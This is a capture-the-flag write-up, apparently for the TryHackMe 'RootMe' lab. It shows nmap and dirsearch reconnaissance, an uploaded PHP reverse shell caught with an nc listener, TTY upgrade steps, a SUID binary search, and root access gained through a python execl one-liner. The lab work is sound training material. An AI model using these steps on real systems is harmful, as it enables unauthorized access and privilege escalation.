first step here is to do reconnaissance 

```
ewso@winds:~$ nmap -sC -sV 10.10.243.117
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-08 01:00 GMT
Nmap scan report for 10.10.243.117
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.87 seconds
```
here we can see that the apache server version is 2.4 

```
ewso@winds:~/dirsearch$ python3 dirsearch.py -u 10.10.243.201 -e php,asp,txt,js

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, txt, js | HTTP method: GET | Threads: 30 | Wordlist size: 10365

Error Log: /home/ewso/dirsearch/logs/errors-21-01-07_23-10-23.log

Target: http://10.10.243.201/

Output File: /home/ewso/dirsearch/reports/10.10.243.201/_21-01-07_23-10-23.txt

[23:10:23] Starting:
[23:10:24] 301 -  311B  - /js  ->  http://10.10.243.201/js/       
[23:10:29] 403 -  278B  - /.htaccess.bak1
[23:10:29] 403 -  278B  - /.htaccess.orig
[23:10:29] 403 -  278B  - /.htaccess.sample
[23:10:29] 403 -  278B  - /.htaccess.save
[23:10:29] 403 -  278B  - /.htaccessBAK
[23:10:29] 403 -  278B  - /.htaccess_extra
[23:10:29] 403 -  278B  - /.htaccessOLD
[23:10:29] 403 -  278B  - /.htaccess_orig
[23:10:29] 403 -  278B  - /.htaccessOLD2
[23:10:29] 403 -  278B  - /.htaccess_sc
[23:10:29] 403 -  278B  - /.htm
[23:10:29] 403 -  278B  - /.html
[23:10:29] 403 -  278B  - /.ht_wsr.txt
[23:10:29] 403 -  278B  - /.htpasswds
[23:10:29] 403 -  278B  - /.htpasswd_test
[23:10:29] 403 -  278B  - /.httr-oauth
[23:10:30] 403 -  278B  - /.php
[23:10:47] 301 -  312B  - /css  ->  http://10.10.243.201/css/
[23:10:52] 200 -  616B  - /index.php
[23:10:52] 200 -  616B  - /index.php/login/
[23:10:53] 200 -  959B  - /js/
[23:10:57] 301 -  314B  - /panel  ->  http://10.10.243.201/panel/ *
[23:10:57] 200 -  732B  - /panel/
[23:11:00] 403 -  278B  - /server-status
[23:11:00] 403 -  278B  - /server-status/
[23:11:04] 301 -  316B  - /uploads  ->  http://10.10.243.201/uploads/ *
[23:11:04] 200 -  744B  - /uploads/

Task Completed
ewso@winds:~/dirsearch$
```

here we can see that theres 2 important directories in the website being the panel and the uploads , visiting them we can see that the upload directory is for uploading files so lets upload a reverse shell php,


```
ewso@winds:~$ nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.243.117 38216
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:08:01 up  1:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```
ewso@winds:~$ nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.243.117 38216
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:08:01 up  1:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ ^Z
[1]+  Stopped                 nc -nvlp 1234
ewso@winds:~$ ^C
```

```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

```
bash-4.4$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
bash-4.4$
bash-4.4$ cat /var/www/user.txt
THM{###############}

```

find / -user root -perm /40002>/dev/null
```
bash-4.4$ find / -user root -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
bash-4.4$
```

go to gtfo bins
```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# whoami
root
# cat /root/root.txt
THM{####################}
#
```
